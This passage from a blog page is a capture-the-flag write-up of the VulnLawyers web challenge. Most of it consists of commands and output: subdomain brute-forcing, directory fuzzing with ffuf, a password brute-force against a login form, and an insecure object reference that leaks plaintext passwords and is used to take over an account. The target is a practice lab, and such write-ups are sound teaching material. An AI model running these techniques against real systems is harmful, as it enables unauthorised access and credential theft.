            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Oh yes. Plain old passwords. Of course, they should have used the
<code>data.vulnlawyers.co.uk/users</code> API endpoint to retrieve that data. Let's access
<em>Shayne Cairns</em> profile details with the user <code>id</code> which we can find at
<code>data.vulnlawyers.co.uk/users</code>. Small note: that id was zero-indexed (Jaskaran's
<code>id</code> here is <code>4</code> while it was <code>3</code> before), this one isn't. Compensating for that
gives the following request.</p>

      <div id="code-parent">
        <pre><code class="hljs">$ curl http:<span class="hljs-regexp">//</span>www.vulnlawyers.co.uk<span class="hljs-regexp">/lawyers-only-profile-details/</span><span class="hljs-number">2</span> -H <span class="hljs-string">&quot;Cookie: ctfchallenge=&lt;your_ctf_cookie&gt;; token=&lt;your_lawyer_cookie&gt;&quot;</span>

{
  <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>,
  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Shayne Cairns&quot;</span>,
  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;shayne.cairns@vulnlawyers.co.uk&quot;</span>,
  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;w&amp;#2a1^3p&quot;</span>,
  <span class="hljs-string">&quot;flag&quot;</span>: <span class="hljs-string">&quot;[^FLAG^NA_AH^FLAG^]&quot;</span>
}
</code></pre>

        <button id="code-copy-button" class="" data-clipboard-text="$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H &quot;Cookie: ctfchallenge=<your_ctf_cookie>; token=<your_lawyer_cookie>&quot;

{
  &quot;id&quot;: 2,
  &quot;name&quot;: &quot;Shayne Cairns&quot;,
  &quot;email&quot;: &quot;shayne.cairns@vulnlawyers.co.uk&quot;,
  &quot;password&quot;: &quot;w&#2a1^3p&quot;,
  &quot;flag&quot;: &quot;[^FLAG^NA_AH^FLAG^]&quot;
}
" style="text-align: right;" title="Copy code in block">
            <img class="code-copy-button-icon " src="" alt="copy" style="padding: 0px 1em 7px 0px; display:none"/>
            <div class="code-copy-button-text " style="padding-right: 10px; vertical-align:middle;">copy</>
        </button>
      </div>
    <p>Flag number five!</p>
<h3 id="finishing-up-(exploitation)" tabindex="-1">Finishing Up (Exploitation)</h3>
<p>This leaves us to the last flag. We now use the found credentials to log in as
Shayne Cairns, delete the case, and find the last flag 🏆.</p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302">302 Found</a> <a href="#fnref1" class="no-underline">¶</a></p>
</li>
</ol>
</section>
</div></div></main><footer class="mt-8 p-4 px-8"><div class="container max-w-3xl mx-auto text-neutral-500 dark:text-neutral-400 flex justify-between"><div>© 2022 - Zohar Cochavi</div><a href="https://github.com/cochaviz/bunkernet">check the source</a></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"frontmatter":{"title":"CTF Challenge VulnLawyers Writeup","metaTitle":"CTF Challenge VulnLawyers Writeup","metaDesc":"A writeup for the VulnLawyers challenge from ctfchallenge.com","metaImg":"https://ctfchallenge.com/images/ctflogo-trans.png","date":"2022-09-14","tags":["ctf","web","writeup"]},"content":"\n[[toc]]\n\n## A Little Disclaimer\n\nSo you're looking for answers, are ya? Well, I've got them, but for a price...\nNamely a little bit of your time and attention:\n\n**Please try the challenges yourself before checking the answers.**\n\nCTF's are notoriously 'NP' prone. Once you've seen the answer, it's easy\nto think you could've come up with that. There is nothing wrong with looking up\nanswers, but try reflect on why you couldn't figure it out. I try to explain my\nthought process as best and brief as possible, but figuring it out yourself is\njust the best feeling, so please give it another go when you're reading this!\nI'll not include any of the flags to avoid people simply copying and pasting\nthem.\n\nAnother note, I create these writeups as if speaking to myself. If my manner of\nspeaking seems a bit odd, you try talking to yourself without sounding\na little odd.\n\n## Flags\n\n### Data Baby (Enumeration)\n\nThe first flag can be found by performing a standard recon of the subdomains of\n`vulnlawyers.co.uk`.\n```\n$ dnsrecon -d vulnlawyers.co.uk -D ~/path/to/wordlists/subdomains.txt -t brt\n\n[*] Using the dictionary file: /home/zohar/Documents/Playground/wordlists/subdomains.txt (provided by user)\n[*] brt: Performing host and subdomain brute force against vulnlawyers.co.uk...\n[+] \tA data.vulnlawyers.co.uk 68.183.255.206\n[+] \tA www.vulnlawyers.co.uk 68.183.255.206\n[+] 2 Records Found\n```\n\nDoing a http request with `curl`, or opening the domain in your browser returns\nsome info about the API and the first flag.\n```\n$ curl http://data.vulnlawyers.co.uk -H \"Cookie: \u003cyour_ctf_cookie\u003e\"\n\n{\"name\":\"VulnLawyers Website API\",\"version\":\"2.1.04\",\"flag\":\"[^FLAG^1337-DIY-1337^FLAG^]\"}\n```\n\n### Browsers are Evil (Enumeration)\n\nNow that we know the different domains that are available to us, let's do some\nrecon on the different files and folders we have access to.\n```\n$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\" -u http://www.vulnlawyers.co.uk/FUZZ\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n[...]\n________________________________________________\n\ncss                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\ndenied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]\nimages                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]\njs                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 14ms]\nlogin                   [Status: 302, Size: 1119, Words: 197, Lines: 31, Duration: 16ms]\n```\n\nSince we are (always) looking to escalate privileges, the `login` endpoint looks\nespecially interesting. Entering `http://www.vulnlawyers.co.uk/login` in your\nbrowser will lead to a page that says **Acess is denied from your IP address**.\nShit. But take a look at where we are `http://www.vulnlawyers.co.uk/denied`,\nwe've been rerouted. \n\nLet's take a look at what happens with our request in the browser by opening the\ndeveloper tab (often \u003ckbd\u003eF12\u003c/kbd\u003e, but if you didn't know that, you might want\nto look into some other challenges). Opening the 'Network' tab (on\nFirefox, might be different on Chrome, Safari, etc.) shows that we got a `302`\ncode from the `/login` endpoint. This code specifically tells a *browser* to\nreroute to a URL given by the `Location` header [^1].\n\nBrowsers can do weird stuff, so let's try to ask `curl` what's up.\n```\n$ curl www.vulnlawyers.co.uk/login -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\"\n\n[...]\n  \u003cdiv class=\"alert alert-info\"\u003e\n      \u003cp\u003eAccess to this portal can now be found here \u003ca href=/lawyers-only\"\u003e/lawyers-only\u003c/a\u003e\u003c/p\u003e\n      \u003cp\u003e[^FLAG^TRY_ME_B*TCH^FLAG^]\u003c/p\u003e\n  \u003c/div\u003e\n[...]\n```\nWell, would you look at that, a flag and a hidden endpoint :eyes:! Christmas\ncame early this year.\n\nOpening the URL `http://www.vulnlawyers.co.uk/lawyers-only` will bring us to a\nlogin screen. Now we can start gaining some unrequisited privileges.\n\n### Pipelining (Enumeration)\n\nThe current goal is to log in, but we lack any user data. Thinking back, the\n`data.vulnlawyers.co.uk` probably contains some of that precious user data.\nActually, we have yet to enumerate files and folders. Not you tho, no, while we\nwere trying to figure out how to access the login page, you have of course\nstarted `ffuf`'ing (that's not a word, but it should be) the domain. If you\nhaven't, keep in mind that reconnaissance can sometimes take a long time.\nMinimize waiting and keep that noggin of yours churning.\n\n```\n$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\" -u http://data.vulnlawyers.co.uk/FUZZ\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n[...]\n________________________________________________\nusers                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]\n```\n\n'Lo and behold, an endpoint called `/users`. Let's employ `curl` and see what it\nholds.\n```\ncurl data.vulnlawyers.co.uk/users -H \"Cooki e: ctfchallenge=\u003cyour_ctf_cookie\u003e\"\n{\n  \"users\": [\n    {\n      \"name\": \"Yusef Mcclain\",\n      \"email\": \"yusef.mcclain@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Shayne Cairns\",\n      \"email\": \"shayne.cairns@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Eisa Evans\",\n      \"email\": \"eisa.evans@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Jaskaran Lowe\",\n      \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\"\n    },\n    {\n      \"name\": \"Marsha Blankenship\",\n      \"email\": \"marsha.blankenship@vulnlawyers.co.uk\"\n    }\n  ],\n  \"flag\": \"[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]\"\n}\n```\n\nAnd that's our third flag. Onto exploitation!\n\n### Higher and Higher (Exploitation)\n\nWith a bit of luck, the attorneys are not technically inclined and use simple\npasswords. After a bit of trail-and-error, we stumble upon Jaskaran Lowe.\n\n```\nffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e\" -u http://www.vulnlawyers.co.uk/lawyers-only-login -H \"Content-Type: applicati\non/x-www-form-urlencoded\" -d 'email=jaskaran.lowe@vulnlawyers.co.uk\u0026password=FUZZ' -fr \"Invalid\"\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n[...]\n________________________________________________\n\nsummer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]\n```\n\nLogging in using browser gives us some info regarding a case, but more\nimportantly, the next flag!\n\n### Some More Digging (Exploitation)\n\nWe got a whole new section of the site to explore! Now, it might be worth doing\nsome more fuzzing on the path since we've actually been redirected to\n`.../lawyers-only-login` from `.../lawyers-only`, and opening the **Profile\ntab** shows the path `.../lawyers-only-profile`. Thus, we run `ffuf [...]\nhttp://www.vulnlawyers.co.uk/lawyers-only-FUZZ` while further exploring the new\ndomain. Spoiler alert: no interesting results, but good habit nonetheless.\n\nLooking at the **Portal** page shows a list of current cases. There is a single\ncase which is managed by *Shayne Cairns*, who is also the only one who can\nperform actions on it. New goal: gain access to their account. Opening the\nsource code of the shows nothing interesting.\n\nTaking a closer look at the **Profile** page shows us a place where we can\nupdate our user data! Immediate thought: could we somehow use this to update\nanother user's profile info? Let's take a look at the request payload using the\n**Network** tab in the dev tools.\n\n```\nname=Jaskaran+Lowe\u0026email=jaskaran.lowe%40vulnlawyers.co.uk\n```\n\nHmm, doesn't seem like it. This leads to finding more info in the request,\nlike a new cookie called `token`. Makes sense, these requests have to be\nauthenticated, we should include this in any requests we do via the terminal.\nOtherwise, nothing seems unusual.\n\nPerhaps we can find something interesting in the source code. Let's use `curl`\nto retrieve the data.\n```\n$ curl curl http://www.vulnlawyers.co.uk/lawyers-only-profile -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e; token=\u003cyour_lawyer_cookie\u003e\"\n\n\u003cscript\u003e\n    $.getJSON('/lawyers-only-profile-details/4',function(resp){\n        $('input[name=\"email\"]').val( resp.email );\n        $('input[name=\"name\"]').val( resp.name );\n    });\n\u003c/script\u003e\n```\n\nOh would you look at that :sunglasses:! That's how our info was already filled in!\nFor some reason they use some other source than the\n`data.vulnlawyers.co.uk/users` endpoint which we've seen before. Maybe this\ncontains different information.\n```\n$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/4 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e; token=\u003cyour_lawyer_cookie\u003e\"\n\n{\n  \"id\": 4,\n  \"name\": \"Jaskaran Lowe\",\n  \"email\": \"jaskaran.lowe@vulnlawyers.co.uk\",\n  \"password\": \"summer\"\n}\n```\n\nOh yes. Plain old passwords. Of course, they should have used the\n`data.vulnlawyers.co.uk/users` API endpoint to retrieve that data. Let's access\n*Shayne Cairns* profile details with the user `id` which we can find at\n`data.vulnlawyers.co.uk/users`. Small note: that id was zero-indexed (Jaskaran's\n`id` here is `4` while it was `3` before), this one isn't. Compensating for that\ngives the following request.\n```\n$ curl http://www.vulnlawyers.co.uk/lawyers-only-profile-details/2 -H \"Cookie: ctfchallenge=\u003cyour_ctf_cookie\u003e; token=\u003cyour_lawyer_cookie\u003e\"\n\n{\n  \"id\": 2,\n  \"name\": \"Shayne Cairns\",\n  \"email\": \"shayne.cairns@vulnlawyers.co.uk\",\n  \"password\": \"w\u0026#2a1^3p\",\n  \"flag\": \"[^FLAG^NA_AH^FLAG^]\"\n}\n```\nFlag number five!\n\n### Finishing Up (Exploitation)\n\nThis leaves us to the last flag. We now use the found credentials to log in as\nShayne Cairns, delete the case, and find the last flag :trophy:.\n\n[^1]: [302 Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)\n"},"__N_SSG":true},"page":"/post/[slug]","query":{"slug":"ctf-challenge-vulnlawyers"},"buildId":"kXWORFBNEYWabX1ovPQjE","isFallback":false,"gsp":true,"scriptLoader":[]}</script><script async="" src="//static.getclicky.com/101354370.js"></script><noscript><p><img alt="Clicky" width="1" height="1" src="//in.getclicky.com/101354370ns.gif"/></p></noscript></body></html>